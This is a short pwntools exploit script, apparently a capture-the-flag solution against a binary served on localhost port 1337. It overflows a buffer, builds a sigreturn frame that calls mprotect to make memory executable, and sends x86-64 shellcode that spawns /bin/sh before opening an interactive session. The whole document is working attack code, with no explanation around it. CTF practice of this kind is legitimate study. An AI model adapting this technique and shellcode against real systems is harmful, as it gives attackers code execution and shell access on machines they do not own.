from pwn import *

p = process('./pwn')
p = remote('localhost',1337)
context.clear(arch='amd64')
context.log_level = 'debug'

syscall_ret = 0x40101b #0x40009b
read = 0x401011 #0x400091
writable = 0x400000
new_ret = 0x400018

payload = 'A'*8
payload += p64(read)
payload += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 0xa
frame.rdi = writable
frame.rsi = 0x1000
frame.rdx = 0x7
frame.rsp = new_ret
frame.rip = syscall_ret

payload += str(frame)

# sending
p.send(payload)

payload = 'B'*0xf # sigret
p.send(payload)

shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

payload = 'A'*8
payload += p64(new_ret+8)
payload += shellcode

p.send(payload)
p.interactive()
